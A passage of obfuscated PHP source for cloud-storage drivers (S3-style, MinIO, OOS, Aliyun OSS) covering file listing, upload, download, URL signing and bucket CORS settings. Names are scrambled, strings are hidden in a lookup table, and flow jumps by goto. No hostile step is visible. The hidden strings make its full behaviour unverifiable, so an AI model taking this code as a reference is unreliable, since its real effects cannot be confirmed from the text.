$b‹½»À’çš = $this->listObjs($E²ƒò°†Ã³, $aÒ½¤‡Õ¬, $EÖõâİ¼, $F™ÖƒÉ˜Ã‘); if (!$b‹½»À’çš) { break; } $aÒ½¤‡Õ¬ = $b‹½»À’çš[$DŒ•È˜‚õÏ[201]]; $f‡Ñğ‰õ– = $b‹½»À’çš[$DŒ•È˜‚õÏ[197]]; $A‰ñ¥²—»ì = $b‹½»À’çš[$DŒ•È˜‚õÏ[200]]; if (empty($f‡Ñğ‰õ–) && empty($A‰ñ¥²—»ì)) { break; } if (count($f‡Ñğ‰õ–) == 1 && $f‡Ñğ‰õ–[0][$DŒ•È˜‚õÏ[28]] == $b‘‡ºÂäÓÏ) { break; } if ($D¥ˆ„Ÿ†èô) { if (count($f‡Ñğ‰õ–)) { $f‡Ñğ‰õ– = array_column($f‡Ñğ‰õ–, $DŒ•È˜‚õÏ[28]); $e§óî¥®º = array_merge($e§óî¥®º, $f‡Ñğ‰õ–); } if (count($A‰ñ¥²—»ì)) { $A‰ñ¥²—»ì = array_column($A‰ñ¥²—»ì, $DŒ•È˜‚õÏ[28]); $BÈÎ±À–°ó = array_merge($BÈÎ±À–°ó, $A‰ñ¥²—»ì); } if ($aÒ½¤‡Õ¬ === null) { break; } continue; } if ($FòßğÇ«‘Š) { if (!empty($f‡Ñğ‰õ–)) { if (count($f‡Ñğ‰õ–) > 1 || isset($f‡Ñğ‰õ–[0][$DŒ•È˜‚õÏ[28]]) && $f‡Ñğ‰õ–[0][$DŒ•È˜‚õÏ[28]] != $b‘‡ºÂäÓÏ) { return !0; } } } else { if (!empty($A‰ñ¥²—»ì)) { return !0; } } if ($aÒ½¤‡Õ¬ === null) { break; } } if ($D¥ˆ„Ÿ†èô) { $e§óî¥®º = array_diff($e§óî¥®º, array($b‘‡ºÂäÓÏ)); $e§óî¥®º = count(array_unique($e§óî¥®º)); $BÈÎ±À–°ó = count(array_unique($BÈÎ±À–°ó)); return array($DŒ•È˜‚õÏ[202] => $e§óî¥®º, $DŒ•È˜‚õÏ[203] => $BÈÎ±À–°ó); } goto f¤»¢÷ñ“; a“Ÿİ©õ™‰: } public function listAll($b„¥ë”Ì‘±) { $CÎÈ‡Îõ§¿ =& $_SERVER[Šº]; $aÚñ¼³öÂ = $this->fileList($b„¥ë”Ì‘±, $CÎÈ‡Îõ§¿[33], !0); $BÃ×óÂ˜‹» = array(); foreach ($aÚñ¼³öÂ[$CÎÈ‡Îõ§¿[74]] as $d‹½²ÂàÉ‹) { $BÃ×óÂ˜‹»[$d‹½²ÂàÉ‹[$CÎÈ‡Îõ§¿[28]]] = $d‹½²ÂàÉ‹[$CÎÈ‡Îõ§¿[78]]; } foreach ($aÚñ¼³öÂ[$CÎÈ‡Îõ§¿[75]] as $d‹½²ÂàÉ‹) { if (is_string($d‹½²ÂàÉ‹)) { $BÃ×óÂ˜‹»[$d‹½²ÂàÉ‹] = 0; } } return $this->listAllFiles($b„¥ë”Ì‘±, array_keys($BÃ×óÂ˜‹»), $BÃ×óÂ˜‹»); } public function canRead($fâ¨‚¢µÓ) { $EÚÇªÉŠºõ =& $_SERVER[Šº]; $b¸³ˆµØª = $this->client->getAccessControlPolicy($this->bucket, $fâ¨‚¢µÓ); if (!$b¸³ˆµØª) { return !1; } return in_array($b¸³ˆµØª, array($EÚÇªÉŠºõ[204], $EÚÇªÉŠºõ[205], $EÚÇªÉŠºõ[206])) ? !0 : !1; } public function canWrite($fè…™‘Ğß§) { $Bà¦®ªÙé =& $_SERVER[Šº]; $BÔ©„òèÉ‰ = $this->client->getAccessControlPolicy($this->bucket, $fè…™‘Ğß§); if (!$BÔ©„òèÉ‰) { return !1; } return in_array($BÔ©„òèÉ‰, array($Bà¦®ªÙé[204], $Bà¦®ªÙé[205])) ? !0 : !1; } public function getContent($E¦Šñ¨àÏˆ) { return $this->client->getObject($this->bucket, $E¦Šñ¨àÏˆ); } public function setContent($Aäà’ê¨Ó”, $EàÏæ°ĞµÒ = '', $cöìšëÊùï = false) { goto bìâ‘´¶¯ª; bìâ‘´¶¯ª: $d¢„è“©²Ç =& $_SERVER[Šº]; $Aäà’ê¨Ó” = $cöìšëÊùï ? trim($Aäà’ê¨Ó”, $d¢„è“©²Ç[8]) . $d¢„è“©²Ç[8] : $Aäà’ê¨Ó”; $BôéÂ—êÇ‡ = get_file_mime(get_path_ext($Aäà’ê¨Ó”)); goto bïíİ; bïíİ: $E¥¯†ŸåªØ = $this->client->putObject($EàÏæ°ĞµÒ, $this->bucket, $Aäà’ê¨Ó”, $d¢„è“©²Ç[191], array(), $BôéÂ—êÇ‡); if (!$E¥¯†ŸåªØ) { return !1; } if ($cöìšëÊùï) { return !0; } goto E‡ƒ˜Î›ë–; E‡ƒ˜Î›ë–: $this->cacheMethod(null, null); $E¥¯†ŸåªØ = $this->copyFile($Aäà’ê¨Ó”, $Aäà’ê¨Ó”, array($d¢„è“©²Ç[207] => $E¥¯†ŸåªØ[$d¢„è“©²Ç[208]])); return $E¥¯†ŸåªØ ? !0 : !1; goto fíî¨ö¸¶±; fíî¨ö¸¶±: } public function fileSubstr($E™ÁëñŠÓÃ, $cÌ§ÙÍãâÚ, $b›µÖ¸¦) { $aÅ¬º˜«¸ƒ = $cÌ§ÙÍãâÚ + $b›µÖ¸¦ - 1; return $this->client->getObject($this->bucket, $E™ÁëñŠÓÃ, array($_SERVER[Šº][209] => "\x62\x79\x74\145\x73\75{$cÌ§ÙÍãâÚ}\x2d{$aÅ¬º˜«¸ƒ}")); } public function upload($C©®Œ˜Üçª, $DÂÇ¢°ù¾÷, $F‹§²ƒö  = false, $eĞİ¸ĞÁõá = REPEAT_REPLACE) { $fìîÃ¢§ï• =& $_SERVER[Šº]; $B»´”ï’— = array($fìîÃ¢§ï•[207] => @md5_file($DÂÇ¢°ù¾÷)); $ağ‰›‹„àÚ = array($fìîÃ¢§ï•[210] => get_file_mime(get_path_ext($C©®Œ˜Üçª))); if (IO::size($DÂÇ¢°ù¾÷) <= 1024 * 1024 * 200) { $eÖØŸ­ õË = $this->client->putObjectFile($DÂÇ¢°ù¾÷, $this->bucket, $C©®Œ˜Üçª, $fìîÃ¢§ï•[191], $B»´”ï’—, $ağ‰›‹„àÚ); return !empty($eÖØŸ­ õË) ? $this->getPathOuter($C©®Œ˜Üçª) : !1; } $Aê‹‡ÅïÍ = $this->client->multiUploadObject($DÂÇ¢°ù¾÷, $this->bucket, trim($C©®Œ˜Üçª, $fìîÃ¢§ï•[8]), $B»´”ï’—, $ağ‰›‹„àÚ); return $Aê‹‡ÅïÍ ? $this->getPathOuter($C©®Œ˜Üçª) : !1; } public function download($E‹ŞÛò½ÀŠ, $B´È‚½°–Ê) { if (!@is_dir($this->pathFather($B´È‚½°–Ê)) && !IO::mkdir($this->pathFather($B´È‚½°–Ê))) { return !1; } $f‹©¡†•ˆæ = $this->client->getObject($this->bucket, $E‹ŞÛò½ÀŠ, array(), $B´È‚½°–Ê); return $f‹©¡†•ˆæ !== !1 ? $B´È‚½°–Ê : !1; } public function link($EÎËÎ½ç¿Ë, $FÒÂÑò”¶ = array()) { $A¨Ï²†Ø’ö =& $_SERVER[Šº]; if ($this->signVer == $A¨Ï²†Ø’ö[211]) { return $this->client->getAuthenticatedURL($this->bucket, $EÎËÎ½ç¿Ë, 3600 * 12, $FÒÂÑò”¶); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EÎËÎ½ç¿Ë, $A¨Ï²†Ø’ö[8]), 3600 * 12, $this->region, array(), !0, $FÒÂÑò”¶); } public function fileOut($D®ÃÂÈâè†, $aí•¿ÖÄ»ö = false, $A¸é«á‰Šù = false, $E¦™°¥ÊÓñ = '') { goto Có¤¾–Õ«; Dôˆµ–º±: $E˜ÛØ—çÁñ = get_file_mime(get_path_ext($A¸é«á‰Šù)); if ($E˜ÛØ—çÁñ == $B©¨µ²è§Á[212]) { return parent::fileOut($D®ÃÂÈâè†, $aí•¿ÖÄ»ö, $A¸é«á‰Šù, $E¦™°¥ÊÓñ); } $aí•¿ÖÄ»ö = $aí•¿ÖÄ»ö ? $B©¨µ²è§Á[213] : $B©¨µ²è§Á[214]; goto bèÒñ¬‡µè; bèÒñ¬‡µè: $AùÊ˜ê›©à = array($B©¨µ²è§Á[215] => $aí•¿ÖÄ»ö . $B©¨µ²è§Á[216] . rawurlencode($A¸é«á‰Šù), $B©¨µ²è§Á[217] => $E˜ÛØ—çÁñ); $Dƒääíæ° = $this->link($D®ÃÂÈâè†, $AùÊ˜ê›©à); $this->fileOutLink($Dƒääíæ°); goto bÏ…Ù¸¤áâ; Có¤¾–Õ«: $B©¨µ²è§Á =& $_SERVER[Šº]; if ($this->isFileOutServer()) { return $this->fileOutServer($D®ÃÂÈâè†, $aí•¿ÖÄ»ö, $A¸é«á‰Šù, $E¦™°¥ÊÓñ); } if (!$A¸é«á‰Šù) { $A¸é«á‰Šù = $this->pathThis($D®ÃÂÈâè†); } goto Dôˆµ–º±; bÏ…Ù¸¤áâ: } public function fileOutServer($Dí§Ÿõªçó, $d×Ã¼£à•Ù = false, $cŒ‘¾éŒäÊ = false, $cÍÚ×§¸Éß = '') { parent::fileOut($Dí§Ÿõªçó, $d×Ã¼£à•Ù, $cŒ‘¾éŒäÊ, $cÍÚ×§¸Éß); } public function fileOutImageServer($bÏ¢ôä°áÁ, $E£Éã–¨›¤ = 250) { parent::fileOutImage($bÏ¢ôä°áÁ, $E£Éã–¨›¤); } public function hashMd5($f‰£Úç¢õ, $F­ß£¦ˆëÜ = '') { $F‰„‘éâ“  =& $_SERVER[Šº]; $aÅÉ¯µ’ = $this->objectMeta($f‰£Úç¢õ); if (!$aÅÉ¯µ’) { return !1; } $F­ß£¦ˆëÜ = $F­ß£¦ˆëÜ ? $F­ß£¦ˆëÜ : _get($aÅÉ¯µ’, $F‰„‘éâ“ [218]); $F­ß£¦ˆëÜ = $F­ß£¦ˆëÜ ? $F­ß£¦ˆëÜ : _get($aÅÉ¯µ’, $F‰„‘éâ“ [208], $F‰„‘éâ“ [33]); return $F­ß£¦ˆëÜ; } public function uploadFormData($fíó”ˆ›„Š, $A‰ğ÷ ó¬ = 3600) { $FÖ“†»Šºì =& $_SERVER[Šº]; $eö ïîô¦½ = $this->pathFather($fíó”ˆ›„Š); $d¨÷ğİÁ¿ = $this->client->getHttpUploadPostParams($this->bucket, $eö ïîô¦½, $FÖ“†»Šºì[191], $A‰ğ÷ ó¬); return array_merge((array) $d¨÷ğİÁ¿, array($FÖ“†»Šºì[175] => $this->getHost())); } public function multiUploadFormData($f×•Ñ®“Äˆ, $dÒääÀÄ˜§ = 3600) { $dÔ™ñ¦„Ÿ =& $_SERVER[Šº]; $eêÂŸªÂ™§ = gmdate($dÔ™ñ¦„Ÿ[219]); $Dùø¨«ŒÖ = array(); $AãÕçÛ‡ìé = $this->client->getUploadId($this->bucket, $f×•Ñ®“Äˆ, $Dùø¨«ŒÖ); if (!$AãÕçÛ‡ìé) { return !1; } return array($dÔ™ñ¦„Ÿ[220] => $AãÕçÛ‡ìé, $dÔ™ñ¦„Ÿ[175] => $this->getHost() . $dÔ™ñ¦„Ÿ[8] . $this->pathEncode($f×•Ñ®“Äˆ), $dÔ™ñ¦„Ÿ[221] => $eêÂŸªÂ™§, $dÔ™ñ¦„Ÿ[93] => $f×•Ñ®“Äˆ); } public function multiUploadAuthData($FÛ±¿Ã×, $f“‡³êì¾ = array()) { goto DÃŠäµª½Ü; CÌ¬‘´å„: $bÎ´¿ğñá‚ = $f“‡³êì¾[$D¸„£ù»[93]]; unset($f“‡³êì¾[$D¸„£ù»[93]]); if (isset($f“‡³êì¾[$D¸„£ù»[222]])) { $f“‡³êì¾[$D¸„£ù»[221]] = $A—¸Í°áœ¶; return $this->listUploadParts($bÎ´¿ğñá‚, $f“‡³êì¾); } goto aªŠ¼§ŠÒ; aªŠ¼§ŠÒ: $F¼ºÃ¢§å = array($D¸„£ù»[223], $D¸„£ù»[33], $D¸„£ù»[119], $D¸„£ù»[33], "\170\x2d\141\155\x7a\x2d\144\x61\164\145\72{$A—¸Í°áœ¶}", $D¸„£ù»[8] . $this->bucket . $D¸„£ù»[8] . $this->pathEncode($bÎ´¿ğñá‚) . $F¹¿À®ß…„); if (strpos($F¹¿À®ß…„, $D¸„£ù»[224]) === 0) { $F¼ºÃ¢§å[0] = $D¸„£ù»[225]; } if (isset($f“‡³êì¾[$D¸„£ù»[226]]) && $f“‡³êì¾[$D¸„£ù»[226]] == $D¸„£ù»[227]) { $F¼ºÃ¢§å[0] = $D¸„£ù»[227]; } goto D¸òÔÜìÁÙ; A­²ÓÒ°ŸÆ: if (strpos($F¹¿À®ß…„, $D¸„£ù»[224]) === 0) { return array($D¸„£ù»[231] => $D•òí¯î, $D¸„£ù»[221] => $A—¸Í°áœ¶); } return $D•òí¯î; goto Cê¯Ú·ĞÊ; DÃŠäµª½Ü: $D¸„£ù» =& $_SERVER[Šº]; $A—¸Í°áœ¶ = isset($f“‡³êì¾[$D¸„£ù»[221]]) ? $f“‡³êì¾[$D¸„£ù»[221]] : gmdate($D¸„£ù»[219]); $F¹¿À®ß…„ = isset($f“‡³êì¾[$D¸„£ù»[168]]) ? $f“‡³êì¾[$D¸„£ù»[168]] : $D¸„£ù»[33]; goto CÌ¬‘´å„; D¸òÔÜìÁÙ: $cáò˜ÍÖ‚Å = implode($D¸„£ù»[228], $F¼ºÃ¢§å); $f®¯¼„íè¹ = base64_encode(hash_hmac($D¸„£ù»[229], $cáò˜ÍÖ‚Å, $this->secret, !0)); $D•òí¯î = $D¸„£ù»[230] . $this->accessKey . $D¸„£ù»[4] . $f®¯¼„íè¹; goto A­²ÓÒ°ŸÆ; Cê¯Ú·ĞÊ: } public function listUploadParts($C¢¯”Ë•æñ, $fµ™‡‹•Ş• = array()) { goto E·³ªĞ™ÇÊ; c™‡À¿£ö‚: if (!$F‰¾‘‘ãÛ) { return !1; } unset($fµ™‡‹•Ş•[$aØ¾³¹ÄÕ[222]], $fµ™‡‹•Ş•[$aØ¾³¹ÄÕ[226]]); $fµ™‡‹•Ş•[$aØ¾³¹ÄÕ[93]] = $C¢¯”Ë•æñ; goto bÜ’êùš; E·³ªĞ™ÇÊ: $aØ¾³¹ÄÕ =& $_SERVER[Šº]; $bâ­¹ÈçÓ = str_replace($aØ¾³¹ÄÕ[232], $aØ¾³¹ÄÕ[33], $fµ™‡‹•Ş•[$aØ¾³¹ÄÕ[168]]); $F‰¾‘‘ãÛ = $this->client->listParts($this->bucket, $C¢¯”Ë•æñ, $bâ­¹ÈçÓ); goto c™‡À¿£ö‚; bÜ’êùš: $aš“­ÛòÏô = $this->multiUploadAuthData($C¢¯”Ë•æñ, $fµ™‡‹•Ş•); if (empty($aš“­ÛòÏô)) { return !1; } return array($aØ¾³¹ÄÕ[231] => $aš“­ÛòÏô, $aØ¾³¹ÄÕ[221] => $fµ™‡‹•Ş•[$aØ¾³¹ÄÕ[221]], $aØ¾³¹ÄÕ[233] => $F‰¾‘‘ãÛ); goto F²›«À‹Üİ; F²›«À‹Üİ: } public function getHost() { return parent::getHost() . $_SERVER[Šº][8] . $this->bucket; } public function size($aÆ‘ºŞÌÃÈ) { $d–„ÅÒ‚Û» = $this->objectMeta($aÆ‘ºŞÌÃÈ); return $d–„ÅÒ‚Û» ? $d–„ÅÒ‚Û»[$_SERVER[Šº][78]] : 0; } public function info($C“¥ŸØ¹‡¤) { if ($this->isFolder($C“¥ŸØ¹‡¤)) { return $this->folderInfo($C“¥ŸØ¹‡¤); } else { if ($this->isFile($C“¥ŸØ¹‡¤)) { return $this->fileInfo($C“¥ŸØ¹‡¤); } } return !1; } public function exist($C«¦»—Áå¹) { return $this->isFile($C«¦»—Áå¹) || $this->isFolder($C«¦»—Áå¹); } public function isFile($cÌ°–Òçƒ) { return !$this->isFolder($cÌ°–Òçƒ) && $this->objectMeta($cÌ°–Òçƒ); } public function isFolder($dêŒŒİ¾¶ë) { return $this->cacheMethod($_SERVER[Šº][198], $dêŒŒİ¾¶ë); } protected function objectMeta($F–²˜îØõÓ) { return $this->cacheMethod($_SERVER[Šº][199], $F–²˜îØõÓ); } protected function _objectMeta($e­¤•Ø¼ì•) { $f¬ÕÓ¼Ã‘ =& $_SERVER[Šº]; $e­¤•Ø¼ì• = rtrim($e­¤•Ø¼ì•, $f¬ÕÓ¼Ã‘[8]); try { $cæº­â¿¯Ó = $this->client->getObjectInfo($this->bucket, $e­¤•Ø¼ì•); if (!isset($cæº­â¿¯Ó[$f¬ÕÓ¼Ã‘[218]]) && isset($cæº­â¿¯Ó[$f¬ÕÓ¼Ã‘[234]])) { $cæº­â¿¯Ó[$f¬ÕÓ¼Ã‘[218]] = $cæº­â¿¯Ó[$f¬ÕÓ¼Ã‘[234]]; } } catch (Exception $c²¯™ß¬¨æ) { $cæº­â¿¯Ó = !1; } if (!$cæº­â¿¯Ó) { } return $cæº­â¿¯Ó; } protected function _isFolder($AÓ¯™ˆÈÔî) { goto AÒ«¡â§‚í; BØÈ¢½Æâ“: $e‹ˆ«›‹®· = $this->client->getBucket($this->bucket, $AÓ¯™ˆÈÔî, null, 1); if (empty($e‹ˆ«›‹®·[$E›âºã×¾[197]])) { return !1; } $CÈÎº¯×±Ø = $e‹ˆ«›‹®·[$E›âºã×¾[197]][0][$E›âºã×¾[28]]; goto cÊ­’—´—; AÒ«¡â§‚í: $E›âºã×¾ =& $_SERVER[Šº]; $AÓ¯™ˆÈÔî = rtrim($AÓ¯™ˆÈÔî, $E›âºã×¾[8]); if ($AÓ¯™ˆÈÔî == $E›âºã×¾[33] || $AÓ¯™ˆÈÔî == $E›âºã×¾[8]) { return !0; } goto BØÈ¢½Æâ“; cÊ­’—´—: if (substr($CÈÎº¯×±Ø, -1) == $E›âºã×¾[8]) { return !0; } if (get_path_this($CÈÎº¯×±Ø) == get_path_this($AÓ¯™ˆÈÔî)) { return !1; } return !0; goto c­åõ³¾ì; c­åõ³¾ì: } } define($_SERVER[Šº][235], 1); goto B„ğŸ‡àø„; cÙÒ¾Şº¢’: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($cÙ‡ŸŞğ…³) { parent::__construct($cÙ‡ŸŞğ…³); $this->signatureVersion($_SERVER[Šº][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($dŒÄ¤ÂÏ´í) { parent::__construct($dŒÄ¤ÂÏ´í); $this->signatureVersion($_SERVER[Šº][211]); } public function fileOutLink($BƒŞ’ÅÌË) { $Bˆ…šâæò =& $_SERVER[Šº]; if (substr($BƒŞ’ÅÌË, 0, 7) == $Bˆ…šâæò[1190]) { $BƒŞ’ÅÌË = $Bˆ…šâæò[1191] . substr($BƒŞ’ÅÌË, 7); } header($Bˆ…šâæò[159] . $BƒŞ’ÅÌË); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($b‹òÂ»ó) { parent::__construct(); include_once SDK_DIR . $_SERVER[Šº][1247]; $this->_init($b‹òÂ»ó); } public function _init($fœœæÅ®»¯) { $fÌ¬Ê´Ì¯ =& $_SERVER[Šº]; foreach ($fœœæÅ®»¯ as $DÍÄ§¢÷©ç => $dìå¬Ãƒ„¹) { if (isset($this->{$DÍÄ§¢÷©ç})) { $this->{$DÍÄ§¢÷©ç} = $dìå¬Ãƒ„¹; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fÌ¬Ê´Ì¯[1248] . LNG($fÌ¬Ê´Ì¯[1249])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto dåä½°éËÎ; F®²¿“®‰Û: $C™òÏÑÆÚ->addAllowedOrigin($bÆÜÀÈ´œ[1250]); $C™òÏÑÆÚ->addAllowedMethod($bÆÜÀÈ´œ[1251]); $C™òÏÑÆÚ->addAllowedMethod($bÆÜÀÈ´œ[1252]); goto Bˆç¥·İÏ«; Bˆç¥·İÏ«: $C™òÏÑÆÚ->addAllowedMethod($bÆÜÀÈ´œ[1253]); $C™òÏÑÆÚ->addAllowedMethod($bÆÜÀÈ´œ[1254]); $C™òÏÑÆÚ->addAllowedMethod($bÆÜÀÈ´œ[158]); goto EàéÆÑŒí; EàéÆÑŒí: $C™òÏÑÆÚ->setMaxAgeSeconds(600); $C™òÏÑÆÚ->addExposeHeader($bÆÜÀÈ´œ[1255]); $C™òÏÑÆÚ->addAllowedHeader($bÆÜÀÈ´œ[1250]); goto a¯øŸ®›­Î; dåä½°éËÎ: $bÆÜÀÈ´œ =& $_SERVER[Šº]; $E¶Æãì¹¸ä = new OSS\Model\CorsConfig(); $C™òÏÑÆÚ = new OSS\Model\CorsRule(); goto F®²¿“®‰Û; a¯øŸ®›­Î: $E¶Æãì¹¸ä->addRule($C™òÏÑÆÚ); try { $this->client->putBucketCors($this->bucket, $E¶Æãì¹¸ä); } catch (OSS\Core\OssException $a´Œ„…õì) { return !1; } return !0; goto dƒ îì„¡³; dƒ îì„¡³: } public function getBucketCors() { goto b¨â”È¥¹; dŸ©˜òñ®’: return array($f‰ùåòµ¤¶[181] => isset($AÀŒßÅæ‰·[0]) ? $AÀŒßÅæ‰·[0] : $f‰ùåòµ¤¶[33], $f‰ùåòµ¤¶[185] => $E˜”˜¹ÀğÜ, $f‰ùåòµ¤¶[1256] => $e¾½»ÛŠŞ, $f‰ùåòµ¤¶[1257] => isset($CóïÇâ­ÂÀ[0]) ? $CóïÇâ­ÂÀ[0] : $f‰ùåòµ¤¶[33], $f‰ùåòµ¤¶[183] => isset($AË‰‚‹™Ç[0]) ? $AË‰‚‹™Ç[0] : $f‰ùåòµ¤¶[33]); goto e¿èŸØÇ÷; b¨â”È¥¹: $f‰ùåòµ¤¶ =& $_SERVER[Šº]; $E¼Œó½¾ õ = null; try { $E¼Œó½¾ õ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $B‘öË¹†«) { return null; } goto CóÊÀìï˜†; CóÊÀìï˜†: if (!$E¼Œó½¾ õ || !($DŞ¤‹â‹˜ = $E¼Œó½¾ õ->getRules())) { return null; } $AÀŒßÅæ‰· = $DŞ¤‹â‹˜[0]->getAllowedOrigins(); $E˜”˜¹ÀğÜ = $DŞ¤‹â‹˜[0]->getAllowedMethods(); goto d˜»¥”Ğ·®; d˜»¥”Ğ·®: $e¾½»ÛŠŞ = $DŞ¤‹â‹˜[0]->getMaxAgeSeconds(); $CóïÇâ­ÂÀ = $DŞ¤‹â‹˜[0]->getExposeHeaders(); $AË‰‚‹™Ç = $DŞ¤‹â‹˜[0]->getAllowedHeaders(); goto dŸ©˜òñ®’; e¿èŸØÇ÷: } public function isBucketCors() { goto Eâ·ù¬ïÜ ; Dß¸´ÔÜˆ: if ($bëšÌÜÉ±Ş[$f›ÊøĞÏö‹[181]] != $f›ÊøĞÏö‹[182] || $bëšÌÜÉ±Ş[$f›ÊøĞÏö‹[183]] != $f›ÊøĞÏö‹[182]) { return !1; } $f¤øŸÉìßë = array_map($f›ÊøĞÏö‹[184], $bëšÌÜÉ±Ş[$f›ÊøĞÏö‹[185]]); if (!is_array($f¤øŸÉìßë)) { $f¤øŸÉìßë = array(); } goto dË–Á²…êô; dË–Á²…êô: $Eô• ”œ×¨ = array($f›ÊøĞÏö‹[186], $f›ÊøĞÏö‹[187], $f›ÊøĞÏö‹[188], $f›ÊøĞÏö‹[189], $f›ÊøĞÏö‹[190]); $f¨ª¾˜Ä•µ = array_diff($Eô• ”œ×¨, $f¤øŸÉìßë); return empty($f¨ª¾˜Ä•µ); goto e„µÑç´Ïğ; Eâ·ù¬ïÜ : $f›ÊøĞÏö‹ =& $_SERVER[Šº]; $bëšÌÜÉ±Ş = $this->getBucketCors(); if (!$bëšÌÜÉ±Ş || !is_array($bëšÌÜÉ±Ş)) { return !1; } goto Dß¸´ÔÜˆ; e„µÑç´Ïğ: } public function mkfile($fÉ¯¦¶ïù, $E¬Û¥­ÁÑù = '', $cÂ®£àœº„ = REPEAT_RENAME) { $b½ÆÜ¸îõÎ = $this->setContent($fÉ¯¦¶ïù, $E¬Û¥­ÁÑù); if ($b½ÆÜ¸îõÎ !== !1) { return $this->getPathOuter($fÉ¯¦¶ïù); } return !1; } public function mkdir($bŠôÅÑ‡…Ú, $B¡ôÒŸñË‰ = REPEAT_SKIP) { if ($this->_isFolder($bŠôÅÑ‡…Ú)) { return $this->getPathOuter($bŠôÅÑ‡…Ú); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($bŠôÅÑ‡…Ú)); } catch (OSS\Core\OssException $D¨š¶Æ­) { return !1; } return $this->getPathOuter($bŠôÅÑ‡…Ú); } private function fileList($fÊ•Ÿ…ßÏ„, $A„Á’‹¤…Ö = '', $F¤¶ğ¸Ôîâ = 0) { goto b…£¼áÜ„Ô; b…£¼áÜ„Ô: $a®¢¥¹•Ì® =& $_SERVER[Šº]; $fÊ•Ÿ…ßÏ„ = trim($fÊ•Ÿ…ßÏ„, $a®¢¥¹•Ì®[8]); $C½Ç—ËÚµ› = empty($fÊ•Ÿ…ßÏ„) ? $a®¢¥¹•Ì®[33] : $fÊ•Ÿ…ßÏ„ . $a®¢¥¹•Ì®[8]; goto FÛÜ©ë·ê ; b“Œ¹©„ª: return array($a®¢¥¹•Ì®[75] => $b½ÅÓ§¦Ä±, $a®¢¥¹•Ì®[74] => $FËØ‘¸´½–); goto d’ˆÔ½»‰Â; EŠæËîµ: $b½ÅÓ§¦Ä± = $FËØ‘¸´½– = array(); while (!0) { check_abort(); $b×ƒå‘ÒŒ = array($a®¢¥¹•Ì®[1258] => $A„Á’‹¤…Ö, $a®¢¥¹•Ì®[1259] => $C½Ç—ËÚµ›, $a®¢¥¹•Ì®[1260] => $e¸öãÑ­çÛ, $a®¢¥¹•Ì®[1261] => $f²œ–İ”­‡); try { $EôÉÍ­Ë = $this->client->listObjects($this->bucket, $b×ƒå‘ÒŒ); } catch (OSS\Core\OssException $b½’¦Ì’’¶) { break; } $f²œ–İ”­‡ = $EôÉÍ­Ë->getNextMarker(); $bÌŞ¾ˆÎŒç = $EôÉÍ­Ë->getObjectList(); $F”·¾˜âº‘ = $EôÉÍ­Ë->getPrefixList(); foreach ($bÌŞ¾ˆÎŒç as $e…ä‘ÕŸâò) { goto A—µ«¼Ãù; cÏˆĞ‡ğÏ„: if ($BÖÊê‡Ö÷É) { $this->cacheMethod($a®¢¥¹•Ì®[198], $BÁåÒ÷ÆÒÂ, $A’İÒĞªùØ); $this->cacheMethod($a®¢¥¹•Ì®[199], $BÁåÒ÷ÆÒÂ, array($a®¢¥¹•Ì®[78] => $EÕ±§»õÄ, $a®¢¥¹•Ì®[1262] => $EÕ±§»õÄ, $a®¢¥¹•Ì®[84] => strtotime($eÕÎ…Û±ÖŠ), $a®¢¥¹•Ì®[1263] => $eÕÎ…Û±ÖŠ)); } if ($A’İÒĞªùØ) { $b½ÅÓ§¦Ä±[] = $BÁåÒ÷ÆÒÂ; continue; } $FËØ‘¸´½–[] = $b±´…õº; goto Cš¿¡éö; A—µ«¼Ãù: if ($e…ä‘ÕŸâò->getKey() == $C½Ç—ËÚµ›) { continue; } $BÁåÒ÷ÆÒÂ = $e…ä‘ÕŸâò->getKey(); $EÕ±§»õÄ = $e…ä‘ÕŸâò->getSize(); goto f‡ŠµÇ¡å—; f‡ŠµÇ¡å—: $eÕÎ…Û±ÖŠ = $e…ä‘ÕŸâò->getLastModified(); $b±´…õº = $F¤¶ğ¸Ôîâ ? array($a®¢¥¹•Ì®[28] => $BÁåÒ÷ÆÒÂ, $a®¢¥¹•Ì®[78] => $EÕ±§»õÄ, $a®¢¥¹•Ì®[196] => strtotime($eÕÎ…Û±ÖŠ)) : $BÁåÒ÷ÆÒÂ; $A’İÒĞªùØ = $EÕ±§»õÄ == 0 && substr($BÁåÒ÷ÆÒÂ, strlen($BÁåÒ÷ÆÒÂ) - 1, 1) == $a®¢¥¹•Ì®[8] ? !0 : !1; goto cÏˆĞ‡ğÏ„; Cš¿¡éö: } foreach ($F”·¾˜âº‘ as $eÅä¨­´¥) { $b½ÅÓ§¦Ä±[] = $eÅä¨­´¥->getPrefix(); if ($BÖÊê‡Ö÷É) { $this->cacheMethod($a®¢¥¹•Ì®[198], $BÁåÒ÷ÆÒÂ, !0); } } if ($f²œ–İ”­‡ === $a®¢¥¹•Ì®[33]) { break; } } if ($BÖÊê‡Ö÷É) { $this->cacheMethod($a®¢¥¹•Ì®[198], $fÊ•Ÿ…ßÏ„, !0); } goto b“Œ¹©„ª; FÛÜ©ë·ê : $f²œ–İ”­‡ = $a®¢¥¹•Ì®[33]; $e¸öãÑ­çÛ = 1000; $BÖÊê‡Ö÷É = $this->listItemCache === !1 ? !1 : !0; goto EŠæËîµ; d’ˆÔ½»‰Â: } public function copyFile($Bß÷‚ëÌ¥õ, $f¶Şó‚ùÜà) { $Dß´†ÎòÛ = $this->size($Bß÷‚ëÌ¥õ); if ($Dß´†ÎòÛ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Bß÷‚ëÌ¥õ, $this->bucket, $this->pathEncode($f¶Şó‚ùÜà)); } catch (OSS\Core\OssException $Fèæ·†¶½) { return !1; } return $this->getPathOuter($f¶Şó‚ùÜà); } $C÷Éƒ•¤·á = $this->multiCopyObject($Bß÷‚ëÌ¥õ, $f¶Şó‚ùÜà, $Dß´†ÎòÛ); return $C÷Éƒ•¤·á ? 